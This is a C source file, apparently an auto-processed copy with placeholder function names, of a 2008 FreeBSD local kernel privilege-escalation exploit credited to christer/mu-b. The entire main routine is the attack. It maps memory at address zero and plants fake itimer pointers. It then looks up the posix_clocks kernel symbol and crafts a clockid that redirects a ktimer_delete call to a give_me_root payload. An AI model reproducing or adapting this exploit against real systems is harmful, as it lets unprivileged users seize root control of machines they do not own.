#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct kld_sym_lookup {int version; char* symname; int symvalue; } ;
struct itimer {int it_flags; int it_clockid; scalar_t__ it_usecount; } ;
typedef  int /*<<< orphan*/  ksym ;

/* Variables and functions */
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 int ITPSIZE ; 
 int /*<<< orphan*/  KLDSYM_LOOKUP ; 
 int LOOKUP ; 
 int MAP_ANON ; 
 int MAP_FIXED ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,char*,...) ; 
 scalar_t__ give_me_root ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,struct kld_sym_lookup*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*) ; 
 int FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (struct itimer*,int /*<<< orphan*/ ,int) ; 
 void* FUNC7 (struct itimer**,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 

int
FUNC10 (int argc, char **argv)
{
  struct itimer **itp_page, *it_page;
  struct kld_sym_lookup ksym;
  void *zpage[16];
  int i, r;

  FUNC8 ("FreeBSD local kernel root exploit\n"
          "by: christer/mu-b\n"
          "http://www.bsdcitizen.org/ -- BSDCITIZEN 2008!@$!\n\n");

  itp_page = FUNC7 (0, ITPSIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (itp_page < 0)
    {
      FUNC2 (stderr, "%s: failed to mmap %d-bytes\n",
                       argv[0], ITPSIZE);
      FUNC0 (EXIT_FAILURE);
    }

  FUNC8 ("* allocated pointer page: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) itp_page, (int) itp_page + ITPSIZE, ITPSIZE);

  it_page = FUNC7 (itp_page + ITPSIZE, sizeof (struct itimer),
                  PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON, -1, 0);
  if (it_page < 0)
    {
      FUNC2 (stderr, "%s: failed to mmap %lu-bytes\n",
                       argv[0], sizeof (struct itimer));
      FUNC0 (EXIT_FAILURE);
    }

  FUNC8 ("* allocated itimer struct: 0x%08X -> 0x%08X [%d-bytes]\n",
          (int) it_page, (int) it_page + sizeof (struct itimer), sizeof (struct itimer));

  FUNC8 ("* filling pointer page... ");
  FUNC1 (stdout);

  for (i = 0; i < ITPSIZE / sizeof (struct itimer *); i++)
    itp_page[i] = it_page;
  FUNC8 ("done\n");

  ksym.version = sizeof(ksym);
  ksym.symname = "posix_clocks";

  if (FUNC3(0,KLDSYM_LOOKUP,&ksym) < 0)
    {
      FUNC2 (stderr, "%s: failed to lookup posix_clocks\n", argv[0]);
      FUNC0 (EXIT_FAILURE);
    }

  FUNC8("* found posix_clocks @ [0x%x]\n",(unsigned )ksym.symvalue);

  for (i = 0; i < 16; i++)
    zpage[i] = (void *) give_me_root;

  FUNC6 (it_page,  0, sizeof (struct itimer));
  /* DIRTY REPLACE WITH EXACT STRUCTURE MEMBER */
  for (i = 0; i < 10; i++)
    ((unsigned int *) it_page)[i] = 4;

  it_page->it_flags = 0x00;
  it_page->it_usecount = 0;
  it_page->it_clockid = ((int) &zpage[8] - ksym.symvalue) / 20;

  FUNC8 ("* it_page->it_clockid: 0x%08X [access @0x%08X]\n",
           it_page->it_clockid,(unsigned )&zpage[8]);
  FUNC8 ("* ktimer_delete (0x%08X)\n", LOOKUP);

  FUNC9 (2);
  FUNC4 (0, 0, &i);
  r = FUNC5 (LOOKUP);

  FUNC8 ("* ktimer_delete: %d %d\n", r, it_page->it_flags);

  return (EXIT_SUCCESS);
}